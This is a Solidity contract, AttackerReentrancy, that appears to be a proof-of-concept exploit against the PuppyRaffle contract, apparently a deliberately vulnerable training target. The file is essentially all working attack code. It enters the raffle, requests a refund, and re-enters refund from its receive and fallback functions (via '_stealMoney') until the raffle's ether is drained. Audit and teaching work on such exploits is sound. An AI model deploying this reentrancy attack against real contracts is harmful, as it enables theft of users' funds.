// SPDX-License-Identifier: MIT
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

pragma solidity ^0.7.6;

contract AttackerReentrancy {
    PuppyRaffle puppyRaffle;
    address public attackerAddress = address(this);
    uint256 public attackerIndex;
    uint256 public entranceFee;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function fund() external payable {
        require(msg.value >= 1 ether, "Must send at least 1 ether");
    }

    /**
     * the attacker deposit and call for refund at the same time
     *
     */
    function attack() public payable {
        // puppyRaffle.deposit{value: 1 ether}();
        // puppyRaffle.withdrawBalance();
        address[] memory attacker = new address[](1);
        attacker[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(attacker);
        attackerIndex = puppyRaffle.getActivePlayerIndex(attackerAddress);

        // calling for refund
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    receive() external payable {
        _stealMoney();
    }

    fallback() external payable {
        _stealMoney();
    }
}
